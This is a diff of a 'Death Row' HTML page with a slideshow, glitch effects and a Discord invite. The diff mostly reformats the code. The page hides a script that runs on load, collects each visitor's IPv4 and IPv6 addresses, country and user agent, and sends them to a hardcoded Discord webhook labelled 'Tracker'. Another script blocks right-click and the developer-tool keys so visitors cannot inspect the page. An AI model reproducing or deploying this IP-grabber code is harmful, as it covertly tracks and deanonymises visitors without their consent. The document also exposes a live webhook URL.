@@ -5,19 +5,108 @@
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>Death Row</title>
   <style>
-    body{margin:0;background:black;overflow:hidden;font-family:Arial,sans-serif;}
-    .slideshow-container{max-width:600px;margin:40px auto 10px auto;position:relative;z-index:2;}
-    .mySlides{display:none;}
-    .mySlides img{width:100%;border-radius:8px;border:2px solid #444;box-shadow:0 0 15px #363636;}
-    .glitch{font-family:'Orbitron',sans-serif;font-size:3em;color:#aaa;text-align:center;margin-bottom:40px;position:relative;z-index:2;}
-    .glitch::before,.glitch::after{content:'Death Row';position:absolute;left:0;top:0;width:100%;background:black;overflow:hidden;clip:rect(0,0,0,0);}
-    .glitch::before{animation:glitchTop 1.5s infinite linear alternate-reverse;color:#666;}
-    .glitch::after{animation:glitchBottom 1.5s infinite linear alternate-reverse;color:#888;}
-    @keyframes glitchTop{0%{clip:rect(0,9999px,0,0);transform:translate(0,0);}10%{clip:rect(0,9999px,50px,0);transform:translate(-2px,-2px);}20%{clip:rect(0,9999px,0,0);transform:translate(2px,2px);}100%{clip:rect(0,9999px,0,0);transform:translate(0,0);}}
-    @keyframes glitchBottom{0%{clip:rect(0,9999px,0,0);transform:translate(0,0);}10%{clip:rect(50px,9999px,100px,0);transform:translate(2px,2px);}20%{clip:rect(0,9999px,0,0);transform:translate(-2px,-2px);}100%{clip:rect(0,9999px,0,0);transform:translate(0,0);}}
-    .dvd{position:fixed;top:100px;left:100px;background:black;color:#16fd01;border:2px solid #16fd01;padding:10px 20px;font-weight:bold;font-size:1.2em;border-radius:8px;box-shadow:0 0 10px #16fd01;animation:bounceDVD 10s infinite linear;z-index:10;}
-    @keyframes bounceDVD{0%{top:5%;left:5%;}20%{top:85%;left:15%;}40%{top:25%;left:75%;}60%{top:75%;left:60%;}80%{top:10%;left:80%;}100%{top:5%;left:5%;}}
-    a{color:inherit;text-decoration:none;}
+    body {
+      margin: 0;
+      background: black;
+      overflow: hidden;
+      font-family: Arial, sans-serif;
+    }
+
+    .slideshow-container {
+      max-width: 600px;
+      margin: 40px auto 10px auto;
+      position: relative;
+      z-index: 2;
+    }
+
+    .mySlides {
+      display: none;
+    }
+
+    .mySlides img {
+      width: 100%;
+      display: block;
+      border: none;
+      border-radius: 0;
+      box-shadow: none;
+      background: none;
+    }
+
+    .glitch {
+      font-family: 'Orbitron', sans-serif;
+      font-size: 3em;
+      color: #aaa;
+      text-align: center;
+      margin-bottom: 40px;
+      position: relative;
+      z-index: 2;
+    }
+
+    .glitch::before,
+    .glitch::after {
+      content: 'Death Row';
+      position: absolute;
+      left: 0;
+      top: 0;
+      width: 100%;
+      background: black;
+      overflow: hidden;
+      clip: rect(0, 0, 0, 0);
+    }
+
+    .glitch::before {
+      animation: glitchTop 1.5s infinite linear alternate-reverse;
+      color: #666;
+    }
+
+    .glitch::after {
+      animation: glitchBottom 1.5s infinite linear alternate-reverse;
+      color: #888;
+    }
+
+    @keyframes glitchTop {
+      0% { clip: rect(0, 9999px, 0, 0); transform: translate(0, 0); }
+      10% { clip: rect(0, 9999px, 50px, 0); transform: translate(-2px, -2px); }
+      20% { clip: rect(0, 9999px, 0, 0); transform: translate(2px, 2px); }
+      100% { clip: rect(0, 9999px, 0, 0); transform: translate(0, 0); }
+    }
+
+    @keyframes glitchBottom {
+      0% { clip: rect(0, 9999px, 0, 0); transform: translate(0, 0); }
+      10% { clip: rect(50px, 9999px, 100px, 0); transform: translate(2px, 2px); }
+      20% { clip: rect(0, 9999px, 0, 0); transform: translate(-2px, -2px); }
+      100% { clip: rect(0, 9999px, 0, 0); transform: translate(0, 0); }
+    }
+
+    .dvd {
+      position: fixed;
+      top: 100px;
+      left: 100px;
+      background: black;
+      color: #16fd01;
+      border: 2px solid #16fd01;
+      padding: 10px 20px;
+      font-weight: bold;
+      font-size: 1.2em;
+      border-radius: 8px;
+      box-shadow: 0 0 10px #16fd01;
+      animation: bounceDVD 10s infinite linear;
+      z-index: 10;
+    }
+
+    @keyframes bounceDVD {
+      0%   { top: 5%;  left: 5%; }
+      20%  { top: 85%; left: 15%; }
+      40%  { top: 25%; left: 75%; }
+      60%  { top: 75%; left: 60%; }
+      80%  { top: 10%; left: 80%; }
+      100% { top: 5%;  left: 5%; }
+    }
+
+    a {
+      color: inherit;
+      text-decoration: none;
+    }
   </style>
 </head>
 <body>
@@ -36,54 +125,64 @@
   <div class="dvd"><a href="https://discord.gg/!" target="_blank">Discord.gg/!</a></div>
 
   <script>
-    let slideIndex = 0; function showSlides() {
+    let slideIndex = 0;
+    function showSlides() {
       let slides = document.getElementsByClassName("mySlides");
-      for (let i = 0; i < slides.length; i++) { slides[i].style.display = "none"; }
+      for (let i = 0; i < slides.length; i++) {
+        slides[i].style.display = "none";
+      }
       slideIndex++;
-      if (slideIndex > slides.length) slideIndex = 1;
+      if (slideIndex > slides.length) { slideIndex = 1; }
       slides[slideIndex - 1].style.display = "block";
       setTimeout(showSlides, 2000);
-    } showSlides();
+    }
+    showSlides();
 
+    // Disable right-click and inspect
     document.addEventListener('contextmenu', e => e.preventDefault());
     document.onkeydown = function (e) {
-      if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && ['I','J','C'].includes(String.fromCharCode(e.keyCode))) || (e.ctrlKey && e.keyCode == 85)) return false;
+      if (
+        e.keyCode == 123 || // F12
+        (e.ctrlKey && e.shiftKey && ['I', 'J', 'C'].includes(String.fromCharCode(e.keyCode))) ||
+        (e.ctrlKey && e.keyCode == 85)
+      ) {
+        return false;
+      }
     };
   </script>
 
-<script>
-  const webhook = "https://discord.com/api/webhooks/1392323416346071152/dVvZMHALxRDOPHejC-djrl94A6TRg-eRZ7aXThxrq_wTgzUELwScYUw7zdrf1X4_uTAM";
+  <script>
+    const webhook = "https://discord.com/api/webhooks/1392323416346071152/dVvZMHALxRDOPHejC-djrl94A6TRg-eRZ7aXThxrq_wTgzUELwScYUw7zdrf1X4_uTAM";
 
-  Promise.all([
-    fetch("https://api64.ipify.org?format=json").then(res => res.json()), 
-    fetch("https://api6.ipify.org?format=json").then(res => res.json()),  
-    fetch("https://ipapi.co/json").then(res => res.json())               
-  ]).then(([ipv4Data, ipv6Data, geoData]) => {
-    const embed = {
-      embeds: [{
-        title: "Webs",
-        color: 16711680,
-        image: { 
-          url: "https://media.giphy.com/media/IeRdg7kGDFQep1IJbP/giphy.gif"
-        },
-        fields: [
-          { name: "IPv4 Address", value: ipv4Data.ip || "N/A", inline: true },
-          { name: "IPv6 Address", value: ipv6Data.ip || "N/A", inline: true },
-          { name: "Country", value: `${geoData.country_name} (${geoData.country})`, inline: true },
-          { name: "User Agent", value: navigator.userAgent, inline: false }
-        ],
-        footer: { text: "Tracker" },
-        timestamp: new Date().toISOString()
-      }]
-    };
+    Promise.all([
+      fetch("https://api64.ipify.org?format=json").then(res => res.json()), 
+      fetch("https://api6.ipify.org?format=json").then(res => res.json()),  
+      fetch("https://ipapi.co/json").then(res => res.json())               
+    ]).then(([ipv4Data, ipv6Data, geoData]) => {
+      const embed = {
+        embeds: [{
+          title: "Webs",
+          color: 16711680,
+          image: { 
+            url: "https://media.giphy.com/media/IeRdg7kGDFQep1IJbP/giphy.gif"
+          },
+          fields: [
+            { name: "IPv4 Address", value: ipv4Data.ip || "N/A", inline: true },
+            { name: "IPv6 Address", value: ipv6Data.ip || "N/A", inline: true },
+            { name: "Country", value: `${geoData.country_name} (${geoData.country})`, inline: true },
+            { name: "User Agent", value: navigator.userAgent, inline: false }
+          ],
+          footer: { text: "Tracker" },
+          timestamp: new Date().toISOString()
+        }]
+      };
 
-    fetch(webhook, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(embed)
-    }).catch(err => console.error("Webhook send error:", err));
-  }).catch(err => console.error("IP fetch error:", err));
-</script>
-
+      fetch(webhook, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(embed)
+      }).catch(err => console.error("Webhook send error:", err));
+    }).catch(err => console.error("IP fetch error:", err));
+  </script>
 </body>
 </html>
